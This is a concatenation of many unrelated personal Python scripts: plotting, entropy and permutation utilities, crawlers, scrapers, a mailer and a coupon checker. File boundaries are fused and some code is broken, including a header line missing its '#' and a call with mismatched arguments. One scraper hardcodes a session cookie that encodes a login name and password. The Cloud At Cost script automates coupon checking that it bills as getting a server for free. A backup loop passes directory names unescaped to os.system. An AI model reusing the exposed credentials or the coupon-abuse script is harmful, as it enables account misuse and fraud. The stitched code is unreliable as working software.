def daterange(start_date, end_date):
    for n in range(int((end_date - start_date).days)):
        yield start_date + timedelta(n)


with open("doutniky.csv") as f:
    data = (x.split(",") for x in f.read().splitlines())
    data = {datum.strip(): int(number.strip()) for datum, number in data}


start_date = date(2015, 12, 24)
end_date = date(2018, 12, 7)
for single_date in daterange(start_date, end_date):
    datum = single_date.strftime("%Y/%m/%d")
    data[datum] = data.get(datum, 0)


result = ((datum, data[datum]) for datum in sorted(data.keys()))


x_points = []
y_points = []
for datum, number in result:
    x_points.append(datum)
    y_points.append(number)


fig, ax = plt.subplots(1, 1)
plt.title(u"Spotřeba doutníků")
# plt.xlabel(axis["x"].decode("utf-8"))
# plt.ylabel(axis["y"].decode("utf-8"))
plt.xticks(rotation=60)
plt.plot(x_points, y_points)
fig.tight_layout()

for cnt, label in enumerate(ax.get_xticklabels()):
    if cnt % 30 != 0:
        label.set_visible(False)

# plt.show()
plt.savefig("doutniky.png")
s = [[1, 2, 3], [4, 5, 6], [9, 8, 7]]

def indexes_by_values(s):
    size = len(s[0])  # get matrix size
    s = sum(s, [])    # flattern the list

    out = []
    while max(s) is not None:
        index = s.index(max(s))
        s[index] = None

        val = (index / size, index % size) if index > 0 else (0, 0)
        out.append(val)

    return out


print "generating.."
import random
SIZE = 50
out = []
for y in range(SIZE):
    x_ = []
    for x in range(SIZE):
        x_.append(random.randint(0, SIZE))
    out.append(x_)

print "counting.."
print indexes_by_values(out)
print "done"#! /usr/bin/env python
# -*- coding: utf-8 -*-
# Interpreter version: python 2.7
#
# Imports =====================================================================


# Variables ===================================================================
WORDLIST = [
    "je",
    "to",
    "není",
    "nevěřim",
    "předražený",
    "definice",
    "botnet",
    "botnet!",
    "botnet?",
    "botnety",
    "botnetu",
    "botnetem",
    "ether",
    "ehtereum",
    "bot",
    "net",
]


# Functions & objects =========================================================
def encode_char(c):
    c = ord(c)

    high = (c & 0b11110000) >> 4
    low = c & 0b00001111

    return (WORDLIST[high], WORDLIST[low])


def encode_sentence(sentence):
    out = []

    for c in sentence:
        out.extend(
            encode_char(c)
        )

    return out


# Main program ================================================================
if __name__ == '__main__':
    print "|".join(WORDLIST)
    print
    print " ".join(encode_sentence("Co jsem chtěl jsem řekl. Další argumentace proti kolovrátku postrádá smysl."))
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
#! /usr/bin/env python3
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import lzma

import entropy
import full_cycle
import small_primes


# Variables ===================================================================
PRIMES = tuple(small_primes.get_primes(100))[5:]


# Functions & classes =========================================================
def smaller_entropy(data):
    original_entropy = entropy.entropy(data)

    for seed in PRIMES:
        for step in PRIMES:
            transformed = full_cycle.cycle_data(data, seed, step)
            trasnformed_entropy = entropy.entropy(transformed)

            if trasnformed_entropy < original_entropy:
                print(trasnformed_entropy, seed, step)

                assert full_cycle.uncycle_data(transformed, seed, step) == data

            print(".", end="", flush=True)


 Main program ================================================================
if __name__ == '__main__':
    test_cycle(data)
    test_uncycle(data)

    # print("Looking for smaller entropy..")
    # print(smaller_entropy(data))
#! /usr/bin/env python3
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Inspired by http://troydhanson.github.io/misc/Entropy.html
#
# Imports =====================================================================
import math
from collections import namedtuple


# Variables ===================================================================
EntropyInfo = namedtuple("EntropyInfo", "entropy reducable_to expected_size")


# Functions & classes =========================================================
def entropy(data):
    stats = {x: 0 for x in range(256)}

    if not isinstance(data, list):
        data = list(data)

    total = 0
    for i in data:
        stats[i] += 1
        total += 1

    entropy_count = 0
    for stat in stats.values():
        p = 1.0 * stat / total
        entropy_count -= p * math.log(p, 2)

    return entropy_count


def full_stats(data):
    data = bytes(data)
    ent = entropy(data)

    return EntropyInfo(
        entropy=ent,
        reducable_to=ent / 8 * 100,
        expected_size=len(data) * (ent / 8)
    )


# Main program ================================================================
if __name__ == '__main__':
    import sys

    with open(sys.argv[1], "rb") as f:
        print(full_stats(f.read()))
#! /usr/bin/env python3
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================


# Variables ===================================================================
BIG_PRIME = (2**148 + 1) / 17


# Functions & classes =========================================================
def is_prime(potencial_prime):
    if potencial_prime <= 1:
        return False

    for i in range(potencial_prime - 2):
        i = i + 2

        if potencial_prime % i == 0:
            return False

    return True


def yield_primes():
    prime = 1
    while True:
        prime += 1

        if is_prime(prime):
            yield prime


def get_primes(limit=1000):
    for cnt, prime in enumerate(yield_primes()):
        yield prime

        if cnt >= limit - 1:
            break
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# https://en.wikipedia.org/wiki/Full_cycle
#
# Imports =====================================================================


# Variables ===================================================================
SMALL_PRIME = 1013904223
BIG_PRIME = (2**148 + 1) / 17


# Functions & classes =========================================================
def full_cycle(seed, sample_size, increment=SMALL_PRIME):
    for i in range(sample_size):
        seed = (seed + increment) % sample_size
        yield seed


def cycle_data(data, seed):
    # return [
    #     data[index]
    #     for index in full_cycle(seed, len(data))
    # ]
    
    def xe(data):
        for index in full_cycle(seed, len(data)):
            yield data[index]

    return list(xe(data))


def uncycle_data(data, seed):
    output = [0] * len(data)

    # print(data)

    for cnt, index in enumerate(full_cycle(seed, len(data))):
        # print(cnt, index)
        output[index] = data[cnt]

    return output
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
from os.path import join
from os.path import dirname

import pytest

from entroPY import full_cycle
from entroPY import small_primes


# Variables ===================================================================
PRIMES = tuple(small_primes.get_primes(20))


# Fixtures ====================================================================
@pytest.fixture
def licklider_lzma():
    fn = join(dirname(__file__), "data", "licklider.pdf.lzma")

    with open(fn, "rb") as f:
        return list(f.read())#[:1000]


# Tests =======================================================================
def test_full_cycle():
    sample_size = 1000

    for seed in range(1000):
        cycle = set(full_cycle.full_cycle(seed, sample_size, 1013904223))
        assert len(cycle) == sample_size


def test_cycle(licklider_lzma):
    for seed in PRIMES:
        transformed = full_cycle.cycle_data(licklider_lzma, seed)
        output = full_cycle.uncycle_data(transformed, seed)

        assert licklider_lzma != transformed
        assert licklider_lzma == output


def test_uncycle(licklider_lzma):
    for seed in PRIMES:
        transformed = full_cycle.uncycle_data(licklider_lzma, seed)
        output = full_cycle.cycle_data(transformed, seed)

        assert licklider_lzma != transformed
        assert licklider_lzma == output
#! /usr/bin/env python3
import os
import os.path

import requests


UP_TO = 3668
URL_TEMPLATE = "http://zpovedka.cz/%06d.php"
COOKIES = {
    "PHPSESSID": "28a872e39935900199dc9efd95846613",
    "zp_login": r"a%3A2%3A%7Bs%3A10%3A%22login_name%22%3Bs%3A12%3A%22Bystroushaak%22%3Bs%3A10%3A%22login_pass%22%3Bs%3A6%3A%22391527%22%3B%7D",
}


def compose_path(number):
    return "out/%06d.html" % number


def save_text(content, number):
    with open(compose_path(number), "wb") as f:
        f.write(content)


if not os.path.exists("out"):
    os.mkdir("out")


for cnt in range(UP_TO):
    if os.path.exists(compose_path(cnt)):
        print(cnt, "skipped")
        continue

    resp = requests.get(URL_TEMPLATE % cnt, cookies=COOKIES)
    save_text(bytes(resp.text, resp.encoding), cnt)
    print(cnt, "saved")#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# cherrytree repairer 
# Version: 1.1.0
# Date:    15.01.2012
# Author:  Bystroushaak (bystrousak@kitakitsune.org)
#
# This work is licensed under a Creative Commons 3.0 
# Unported License (http://creativecommons.org/licenses/by/3.0/cz/).
# Created in Geany text editor.
#
# Notes:
    # 
#===============================================================================
# Imports ======================================================================
#===============================================================================
import os.path
import sys
import argparse

try:
	import dhtmlparser as d
except:
	sys.stderr.write("This module require dhtmlparser.\n")
	sys.stderr.write("You can get it from https://github.com/Bystroushaak/DHTMLParser/tree/python\n")
	sys.exit(1)



#===============================================================================
#= Main program ================================================================
#===============================================================================
parser = argparse.ArgumentParser()
parser.add_argument("filename", help = "File which will be fixed.")
args = parser.parse_args()

# read data
if not os.path.exists(args.filename):
	sys.stderr.write("Can't read '" + str(args.filename) + "'!\n")
	sys.exit(1)
else:
	f = open(args.filename)
	data = f.read()
	f.close()

# parse dom
dom = d.parseString(data.replace("<br>", "\n"))

# remove style from headers
for h in dom.find("h2") + dom.find("h1"):
	if "style" in h.params:
		del h.params["style"]

# replace <span style="font-weight:bolder;"> with <strong>
for span in dom.find("span", {"style":"font-weight:bolder;"}):
	n_span = d.HTMLElement("<strong>")
	n_span.childs = span.childs
	n_span.endtag = d.HTMLElement("</strong>")
	span.replaceWith(n_span)
	
# replace <span style="font-style:italic;"> with <i>
for span in dom.find("span", {"style":"font-style:italic;"}):
	n_span = d.HTMLElement("<i>")
	n_span.childs = span.childs
	n_span.endtag = d.HTMLElement("</i>")
	span.replaceWith(n_span)

# replace <span style="text-decoration:underline;text-decoration:line-through;"> with <code>
for span in dom.find("span", {"style":"text-decoration:underline;text-decoration:line-through;"}):
	n_span = d.HTMLElement("<code>")
	n_span.childs = span.childs
	n_span.endtag = d.HTMLElement("</code>")
	span.replaceWith(n_span)

# replace <span style="font-weight:bolder;text-decoration:line-through;"> with <h3>
for span in dom.find("span", {"style":"font-weight:bolder;text-decoration:line-through;"}):
	n_span = d.HTMLElement("<h3>")
	n_span.childs = span.childs
	n_span.endtag = d.HTMLElement("</h3>")
	span.replaceWith(n_span)


def add_p(content):
	c = d.HTMLElement(content)
	
	out = []
	for p in c.__str__().split("\n\n"):
		if p.strip() != "":
			out.append("<p>")
			out.append(p.strip())
			out.append("</p>\n")
	
	return d.parseString("".join(out)).childs

# Use headers as separator. Everything between separator split with "\n\n", add <p> and join.
body = dom.find("body")[0]
alt_body = d.HTMLElement("<body>")
alt_body.endtag = d.HTMLElement("</body>")
content = []
for el in body.childs:
	if el.isTag() and el.getTagName() == "h1" or el.getTagName() == "h2":
		if content != []:
			alt_body.childs.extend(add_p(content))
			content = []
		alt_body.childs.append(el)
	else:
		content.append(el)

if content != []:
	alt_body.childs.extend(add_p(content))

body.replaceWith(alt_body)

# nahrazeni vicero code radku za <pre><code>
for p in dom.find("p"):
	if len(p.childs) >= 1 and p.childs[0].getTagName() == "code":
		pre = d.HTMLElement("<pre>")
		pre.childs = p.childs
		pre.endtag = d.HTMLElement("</pre>")
		p.replaceWith(pre)

print dom.prettify().replace("</p>", "</p>\n").replace("</code>\n</pre>", "</code></pre>")
#! /usr/bin/env python2
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
import sys
import datetime


def timedelta_to_str_hh_mm(td):
    seconds = td.total_seconds()
    hours = seconds // 3600
    minutes = (seconds % 3600) // 60
    
    return "%d:%d" % (hours, minutes)


class Text(object):
    def __init__(self, text):
        self.text = text

    def __str__(self):
        return self.text


class Comment(Text):
    pass


class DayInfo(object):
    def __init__(self, date, in_time, out_time, lunch_time, note):
        self.date = date
        self.in_time = in_time
        self.out_time = out_time
        self.lunch_time = lunch_time
        self.note = note

    def _get_lunch_time(self):
        pattern = "%H:%M"

        zero_time = datetime.datetime.strptime("00:00", pattern)
        lunc_time = datetime.datetime.strptime(self.lunch_time, pattern)

        return lunc_time - zero_time

    def get_duration(self):
        pattern = "%Y-%m-%d %H:%M"

        in_time = datetime.datetime.strptime(
            "%s %s" % (self.date, self.in_time),
            pattern
        )
        out_time = datetime.datetime.strptime(
            "%s %s" % (self.date, self.out_time),
            pattern
        )

        return out_time - in_time - self._get_lunch_time()

    def as_wikiline(self):
        dataset = [
            str(self.date),
            str(self.in_time),
            str(self.out_time),
            str(self.lunch_time),
            str(self.note)
        ]

        if len(self.in_time) > 2 and len(self.out_time) > 2:
            dataset.append(timedelta_to_str_hh_mm(self.get_duration()))
        else:
            dataset.append(" ")

        # return "|| %s ||" % " || ".join(dataset)

        if len(str(self.in_time)) == 1:
            return "|| %s ||     %s     ||     %s     ||     %s      || %s ||%s||" % tuple(dataset)

        return "|| %s ||   %s   ||   %s   ||   %s   || %s ||   %s   ||" % tuple(dataset)

    def __repr__(self):
        return "DayInfo(%r, %r, %r, %r)" % (
            self.date,
            self.in_time,
            self.out_time,
            self.note
        )


class Table(Text):
    def __init__(self, text):
        super(Table, self).__init__(text)
        self.lines = text.splitlines()
        self.monthly_duration = datetime.timedelta(0)

        if self._is_date_table():
            self._compute_time_spend_in_work()

    def _is_date_table(self):
        return self.lines[0].startswith("||= Datum")

    def _as_dayinfo_objects(self):
        for line in self.lines[1:]:
            if line.startswith("|| Celkem"):
                continue

            tokens = [x.strip() for x in line.split("||")]
            duration = None

            if len(tokens) == 7:
                _, date, in_time, out_time, lunch, note, _ = tokens
            else:
                _, date, in_time, out_time, lunch, note, duration, _ = tokens

            yield DayInfo(date, in_time, out_time, lunch, note)

    def _compute_time_spend_in_work(self):
        lines = ["||= Datum =||= Od =||= Do =||= Na obědě =||= Pozn. =||= Přítomnost =||"]

        for day_info in self._as_dayinfo_objects():
            if len(day_info.in_time) > 2 and len(day_info.out_time) > 2:
                self.monthly_duration += day_info.get_duration()

            lines.append(day_info.as_wikiline())

        monthly = timedelta_to_str_hh_mm(self.monthly_duration)
        lines.append("|| || || ||  || Celkem: %s || ||" % monthly)

        self.lines = lines

    def __str__(self):
        return "\n".join(self.lines)


def read_stdin():
    return sys.stdin.read()


def split_into_sections(document):
    output = []
    buffer = []

    lines = document.splitlines()
    while lines:
        line = lines.pop(0)

        if line.startswith(r"{{{"):
            output.append(Text("\n".join(buffer)))
            buffer = [line]

            while True:
                line = lines.pop(0)
                buffer.append(line)

                if line.startswith(r"}}}"):
                    output.append(Comment("\n".join(buffer)))
                    buffer = []
                    break
            continue

        elif line.startswith(r"||"):
            output.append(Text("\n".join(buffer)))
            buffer = [line]

            while True:
                line = lines.pop(0)

                if not line.startswith(r"||"):
                    output.append(Table("\n".join(buffer)))
                    buffer = [line]
                    break

                buffer.append(line)
            continue

        buffer.append(line)

    if buffer:
        output.append(Text("\n".join(buffer)))

    return output


if __name__ == '__main__':
    data = read_stdin()
    sections = split_into_sections(data)

    print "\n".join(str(section) for section in sections)
#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# NONAME v0.0.0 (dd.mm.yy) by Bystroushaak (bystrousak@kitakitsune.org)
# This work is licensed under a Creative Commons Attribution-Noncommercial-Share Alike 3.0 
# Unported License (http://creativecommons.org/licenses/by-nc-sa/3.0/cz/).
# Created in §Editor text editor.
#
#   Pokud hodlate pouzivat tento script, byl bych rad za zpetnou vazbu v podobe kratkeho informacniho 
#   emailu (napriklad maly popis kde budete script vyuzivat, nebo jen zminku o tom ze script pouzivate).
#   U vetsiny scriptu co jsem stvoril totiz nemam tuseni jestli upadly do zapomeni, nebo jsou uzitecne 
#   i nekomu jinemu nez me. Diky.
#
#   If you want to use this script, I'd be happy if you drop me a small feedback message. For example 
#   something about where you use this script, or just a message that this script is useful for you.
#   For most of my scripts, I dont know if they are forgotten, or they are usefull for other people.
#   Thanks.
#   
#
# Notes:
    # Dodelat parsovani titulku
    # Poslat vystup do ghraphvizu
#===============================================================================
# Imports ======================================================================
#===============================================================================
import CheckerTools as ch
from BeautifulSoup import BeautifulSoup as BS
import os.path
import time
import codecs # kvuli pohodlnemu zapisu unicode do vysledneho souboru

#===============================================================================
# Variables ====================================================================
#===============================================================================



#===============================================================================
#= Functions & objects =========================================================
#===============================================================================
def normalizeLink(src):
    if "http://" not in src:
        src = "http://" + src
        
    domain = "http://" + ch.getDomain(src)
        
    src = os.path.normpath(src.replace(domain, "/"))
    src = src.replace("//", "/")
    
    if domain.endswith("/"):
        domain = domain[:-1]
    
    return domain + src
    

def parseLinks(src, domain):
    try:
        data = ch.getPage(src)
        time.sleep(0.5)
    except:
        print "--- Skipping", src
        time.sleep(2)
        return []
        
    try:
        soup = BS(data)
        try:
            title = soup("title")[0].string
        except:
            title = os.path.basename(src)
            
        titles[src] = title

        soup = map(lambda x: x["href"], soup("a"))
    except:
        return []
    
    return soup


def crawler(src, domain):
    print "\t", src
    
    if "raw" in src:
        return
    #~ if "?" in src:
        #~ return
    
    for link in parseLinks(src, domain):
        tlink = link
        
        if (domain in str(tlink)) or ("http://" not in tlink): # prochazi pouze stranky dane domeny
            if not tlink.startswith("http://"): # pokud narazi na nevalidni nebo lokalni odkaz
                if "://" in tlink: # detekce jestli nejde o jiny protokol, napr. ftp
                    continue
                    
                # pokud jde o lokalni odkaz:
                # zjisti domenu se vsim vsudy
                if not "http://" in domain:
                    tdomain = "http://" + domain
                else:
                    tdomain = domain
                    
                # ponekud nepekne vypocita cestu
                tpath = os.path.normpath(src.replace(tdomain, "/")).replace("//", "/")
                if tlink.startswith("/"):
                    tlink = tdomain + tlink
                elif "." not in os.path.basename(tpath) and "?" not in os.path.basename(tpath): # tohle bude delat bordel s rewrite 
                    tlink = tdomain + "/" + tpath + "/" + tlink
                else:
                    tlink = tdomain + "/" + os.path.dirname(tpath) + "/" + tlink
                    
            tlink = normalizeLink(tlink)
                    
            # pokud jeste stranka nebyla nactena
            if tlink not in site_links and (".php" in tlink or ".htm" in tlink or ".html" in tlink or "." not in os.path.basename(tlink)):  
                site_links.append(tlink) # a pridej odkaz do databaze navstivenych
                crawler(tlink, domain)   # precti ji 
            
        # uloz vzah ze tato stranka odkazuje na ..
        links_map.append([src, tlink])

#===============================================================================
#= Main program ================================================================
#===============================================================================

url = "http://kitakitsune.org/"
domain = ch.getDomain(url)
site_links = [] # prozkoumane odkazy
links_map = []  # mapa odkazu (vzdy dvojice urcujici odkud to jde kam)
titles = {}

print "Crawling \"" + domain + "\""

crawler(url, domain)

# vycisteni vysledku od duplicit
tlinks_map = []
for i in links_map:
    if i not in tlinks_map:
        tlinks_map.append(i)
links_map = tlinks_map
del tlinks_map

# vycisteni otaznikovych stranek
links_map = filter(lambda x: "?" not in x[0] and "?" not in x[1], links_map)

# zapsani nodu
file = codecs.open("nodes.csv", "wt", "utf-8")
file.write("Nodes,Id,Label\n")

# ziskani jmen vsech nodu
cnt = 0
tnodes = []
for i in links_map:
    tnodes.append(i[0])
    tnodes.append(i[1])
    
# filtrace duplicit
tnodes = list(set(tnodes))

# pridani id a labelu
nodes = {}
cnt = 0
for node in tnodes:
    label = node
    
    if node in titles:
        if os.path.basename(node) != "":
            label = os.path.basename(node)
        else:
            label = node
    else:
        if domain in node:
            label = node.replace(domain, "/").replace("http://", "").replace("//", "/")
        else:
            label = node
            
    nodes[node] = [cnt, label]
    cnt += 1
del tnodes

for key in nodes.keys():
    file.write(str(nodes[key][0]) + "," + str(nodes[key][0]) + ",\"" + str(nodes[key][1]) + "\"\n")

file.close()


# ulozeni hran
file = codecs.open("edges.csv", "wt", "utf-8")
file.write("Source,Target,Type,Id,Label,Weight\n")

cnt = 0
for source, target in links_map:
    file.write(str(nodes[source][0]) + "," + str(nodes[target][0]) + ",Undirected," + str(cnt) + ",1.0\n")
    cnt += 1


file.close()

#!/usr/bin/env python

import sys
import os.path

TIMELEN = 17

if len(sys.argv) == 1:
    print "Usage:\n\t", sys.argv[0], "filename"
    sys.exit()

filename = sys.argv[1]

ifile = open(filename, "r")
ofile = open(filename + "_", "w")

buff = ""
for line in ifile:
    if len(line) > TIMELEN and len(buff) > TIMELEN: 
        if line[TIMELEN:] != buff[TIMELEN:]:
            ofile.write(line)
    else:
        ofile.write(line)
        
    buff = line

ifile.close()
ofile.close()
#! /usr/bin/env python

import os
import time


dirs = sorted([x for x in os.listdir(".") if "." in x and os.path.isdir(x)])

for d in dirs:
	t = time.strptime(d.split("_")[-1], "%Y.%m.%d")
	ts = time.strftime("%s", t)

	print "Setting time to `%s`." % ts
	print d

	os.system("rdiff-backup --current-time %s %s Dropbox_delta" % (ts, d))
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import sys
import json
import argparse

import dhtmlparser
from httpkie import Downloader


# Variables ===================================================================
DOWNER = Downloader()
BASE_URL = "https://members.cloudatcost.com"


# Functions & objects =========================================================
def get_item_id(data):
    dom = dhtmlparser.parseString(data)
    link = dom.find("a", fn=lambda x: x.getContent() == "Apply Coupon")

    if not link or "onclick" not in link[0].params:
        raise ValueError("Can't find coupon code!")

    iid = link[0].params["onclick"]

    return iid.split("'")[1]


def get_ghash(data):
    data = data.splitlines()
    data = filter(lambda x: "gHash =" in x, data)

    if not data:
        raise ValueError("Can't locate gHash!")

    ghash = data[0].split("=", 1)[-1].strip()

    return ghash.split('"')[1]  # remove quotes


def check_coupon(coupon_code):
    DOWNER.download(BASE_URL + "/order.php?step=1&productGroup=4")
    DOWNER.download(
        BASE_URL + "/order.php?step=2",
        post={
            "productGroup": "4",
            "product": "6",
            "formId": "packageSelect",
            "priceTerm": "0"
        }
    )
    data = DOWNER.download(
        BASE_URL + "/order.php?step=4",
        post={
            "formId": "configureProduct",
            "product": "6",
            "PCT_45": "",
            "addonSelect_1": "addon_1_27_0"
        }
    )

    item_id = get_item_id(data)
    DOWNER.headers["Referer"] = BASE_URL + "/order.php?step=4"
    DOWNER.headers["X-Requested-With"] = "XMLHttpRequest"
    DOWNER.headers["X-Session-Hash"] = get_ghash(data)

    data = DOWNER.download(
        BASE_URL + "/index.php?fuse=admin&action=validateCoupon",
        post={
            "couponCode": coupon_code,
            "itemID": item_id
        }
    )

    json_data = json.loads(data)

    return json_data["success"]


def test_check_coupon():
    test_cases = [
        "BIGGER50",
        "BIGGER75",
        "OMGFREE"
    ]

    for coupon_code in test_cases:
        print coupon_code, check_coupon(coupon_code)


# Main program ================================================================
if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description="""This script is used to check coupons @ Cloud At Cost.
                       In other words: This can get you server for free!"""
    )
    parser.add_argument(
        "coupon",
        nargs="?",
        default=False,
        help="Code of the coupon."
    )
    parser.add_argument(
        "-t",
        "--test",
        action="store_true",
        help="Run tests."
    )
    args = parser.parse_args()

    # run tests?
    if args.test:
        test_check_coupon()
        sys.exit()

    if not args.coupon:
        sys.stderr.write("You have to specify `coupon`!\n")
        sys.exit(1)

    # otherwise run check for coupon from args
    result = check_coupon(args.coupon)

    print result
    sys.exit(1 - int(result))  # convert python's True to bash's true
#! /usr/bin/env python
# -*- coding: utf-8 -*-
"""

by Bystroushaak bystrousak@kitakitsune.org
"""
#
# Interpreter version: python 2.7
# This work is licensed under a Creative Commons 3.0 Unported License
# (http://creativecommons.org/licenses/by/3.0/).
#
#= Imports ====================================================================
import os
import os.path
import random

import sh



#= Variables ==================================================================
ALLOWED_SUFFIXES = [
	"jpg",
	"jpeg",
	"gif",
	"png",
	"bmp"
]
OUT_DIR = "dump/"



#= Main program ===============================================================
if __name__ == '__main__':
	if not os.path.exists(OUT_DIR):
		sh.mkdir(OUT_DIR)

	# go thru all subdirectories and copy every file ending with
	# ALLOWED_SUFFIXES
	for root, dirs, files in os.walk("."):
		for f in files:
			full_path = root + "/" + f
			if not ("." not in f or f.lower().split(".")[-1] in ALLOWED_SUFFIXES):
				continue

			print full_path

			if os.path.exists(OUT_DIR + f):
				sh.mv(
					full_path,
					OUT_DIR + str(random.randint(0, 10000)) + "_" + f
				)
			else:
				sh.mv(
					full_path,
					OUT_DIR + f
				)

	# deduplicate (using md5sum)
	sums = []
	for root, dirs, files in os.walk("./dump"):
		for f in files:
			full_path = root + "/" + f
			md5sum = sh.md5sum(full_path).strip().split()[0]

			if md5sum in sums:
				print "Removing duplicate", full_path
				sh.rm(full_path)
			else:
				print full_path
				sums.append(md5sum)
#coding: UTF8
"""
mailer module

Simple front end to the smtplib and email modules,
to simplify sending email.

A lot of this code was taken from the online examples in the
email module documentation:
http://docs.python.org/library/email-examples.html

Released under MIT license.

Sample code:

import mailer

message = mailer.Message()
message.From = "me@example.com"
message.To = "you@example.com"
message.Subject = "My Vacation"
message.Body = open("letter.txt", "rb").read()
message.attach("picture.jpg")

mailer = mailer.Mailer('mail.example.com')
mailer.send(message)

"""
import smtplib

# Import the email modules we'll need
from email import encoders
from email.message import Message
from email.mime.audio import MIMEAudio
from email.mime.base import MIMEBase
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

# For guessing MIME type based on file name extension
import mimetypes

from os import path

__version__ = "0.1"
__author__ = "Ryan Ginstrom"
__license__ = "MIT"

class Mailer(object):
    """
    Represents an SMTP connection.
    
    Use login() to log in with a username and password.
    """

    def __init__(self, host="localhost"):
        self.host = host
        self._usr = None
        self._pwd = None
    
    def login(self, usr, pwd):
        self._usr = usr
        self._pwd = pwd

    def send(self, msg):
        """
        Send one message or a sequence of messages.

        Every time you call send, the mailer creates a new
        connection, so if you have several emails to send, pass
        them as a list:
        mailer.send([msg1, msg2, msg3])
        """
        server = smtplib.SMTP(self.host)

        if self._usr and self._pwd:
            server.login(self._usr, self._pwd)

        try:
            for m in msg:
                self._send(server, m)
        except TypeError:
            self._send(server, msg)

        server.quit()
    
    def _send(self, server, msg):
        """
        Sends a single message using the server
        we created in send()
        """
        me = msg.From
        you = [x.split() for x in msg.To.split(",")]
        server.sendmail(me, you, msg.as_string())

class Message(object):
    """
    Represents an email message.
    
    Set the To, From, Subject, and Body attributes as plain-text strings.
    Optionally, set the Html attribute to send an HTML email, or use the
    attach() method to attach files.
    
    Even when sending an HTML email, you have to set the Body attribute as
    the alternative text version.
    
    Send using the Mailer class.
    """

    def __init__(self):
        self.attachments = []
        self._to = None
        self.From = None
        self.Subject = None
        self.Body = None
        self.Html = None

    def _get_to(self):
        addrs = self._to.replace(";", ",").split(",")
        return ", ".join([x.strip()
                          for x in addrs])
    def _set_to(self, to):
        self._to = to
    
    To = property(_get_to, _set_to,
                  doc="""The recipient(s) of the email.
                  Separate multiple recipients with commas or semicolons""")

    def as_string(self):
        """Get the email as a string to send in the mailer"""

        if not self.attachments:
            return self._plaintext()
        else:
            return self._multipart()
    
    def _plaintext(self):
        """Plain text email with no attachments"""

        if not self.Html:
            msg = MIMEText(self.Body)
        else:
            msg  = self._with_html()

        self._set_info(msg)
        return msg.as_string()
            
    def _with_html(self):
        """There's an html part"""

        outer = MIMEMultipart('alternative')
        
        part1 = MIMEText(self.Body, 'plain')
        part2 = MIMEText(self.Html, 'html')

        outer.attach(part1)
        outer.attach(part2)
        
        return outer

    def _set_info(self, msg):
        msg['Subject'] = self.Subject
        msg['From'] = self.From
        msg['To'] = self.To

    def _multipart(self):
        """The email has attachments"""

        msg = MIMEMultipart()
        
        msg.attach(MIMEText(self.Body, 'plain'))

        self._set_info(msg)
        msg.preamble = self.Subject

        for filename in self.attachments:
            self._add_attachment(msg, filename)
        return msg.as_string()

    def _add_attachment(self, outer, filename):
        ctype, encoding = mimetypes.guess_type(filename)
        if ctype is None or encoding is not None:
            # No guess could be made, or the file is encoded (compressed), so
            # use a generic bag-of-bits type.
            ctype = 'application/octet-stream'
        maintype, subtype = ctype.split('/', 1)
        fp = open(filename, 'rb')
        if maintype == 'text':
            # Note: we should handle calculating the charset
            msg = MIMEText(fp.read(), _subtype=subtype)
        elif maintype == 'image':
            msg = MIMEImage(fp.read(), _subtype=subtype)
        elif maintype == 'audio':
            msg = MIMEAudio(fp.read(), _subtype=subtype)
        else:
            msg = MIMEBase(maintype, subtype)
            msg.set_payload(fp.read())
            # Encode the payload using Base64
            encoders.encode_base64(msg)
        fp.close()
        # Set the filename parameter
        msg.add_header('Content-Disposition', 'attachment', filename=path.basename(filename))
        outer.attach(msg)

    def attach(self, filename):
        """
        Attach a file to the email. Specify the name of the file;
        Message will figure out the MIME type and load the file.
        """
        
        self.attachments.append(filename)
IPtools.installProxy(
	"localhost",
	IPtools.sshTunnel(
		"bbs@quartz.org",
		"Enter your handle: ",
		timeout  = 30
	)
)#! /usr/bin/env python
# -*- coding: utf-8 -*-
"""

by Bystroushaak (bystrousak@kitakitsune.org
"""
# Interpreter version: python 2.7
# This work is licensed under a Creative Commons 3.0 Unported License
# (http://creativecommons.org/licenses/by/3.0/).
#
#= Imports ====================================================================
from __future__ import print_function


import httpkie
import dhtmlparser as d



#= Variables ==================================================================
DOWNLOAD_LINK = "http://www.XXXX.org/media/videos/flv/$id.flv"
LINKS = [
	"http://www.XXXX.org/search/videos/xxx/?page=39",
]



#= Functions & objects ========================================================
def extractIDs(link):
	down = httpkie.Downloader()
	data = down.download(link)
	dom = d.parseString(data)

	links = map(lambda x:
			x.find("a")[0].params["href"],
		dom.find("div", {"class": "video_box"})
	)

	return map(lambda x: DOWNLOAD_LINK.replace("$id", x.split("/")[2]), links)


def allPages(link, fn):
	link, max_page = link.split("=")

	out = []
	for i in range(int(max_page)):
		out.extend(fn(link + "=" + str(i + 1)))

	return out



#= Main program ===============================================================
if __name__ == '__main__':
	out = []
	for link in LINKS:
		out.extend(allPages(link, extractIDs))

	with open("video_links.txt", "wt") as f:
		f.write("\n".join(set(out)))
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================



# Variables ===================================================================



# Functions & classes =========================================================
def remove_chars(text, chars):
    for char in chars:
        text = text.replace(char, " ")

    return text


def analyze(text):
    text = text.replace(",", ", ")
    text = remove_chars(text, "\n-„“'?!\"'`:;/")
    tokens = text.split()

    results = {}
    old = None
    for token in tokens:
        if not token or token == ",":
            continue

        token = token.lower()  # normalize tokens

        # skip first for buffer
        if old is None or token[-1] in [".", ","] or old[-1] in [".", ","]:
            old = token
            continue

        results[(old, token)] = results.get((old, token), 0) + 1
        old = token

    return results


def get_avg_median(results):
    vals = results.values()
    avg = sum(vals) / float(len(vals))
    median = sorted(vals)[len(vals) / 2]

    return avg, median


def filter_anomalies(data, threshold):
    results = []

    for key, val in data.iteritems():
        if val <= threshold:
            results.append(key)

    return results


# Main program ================================================================
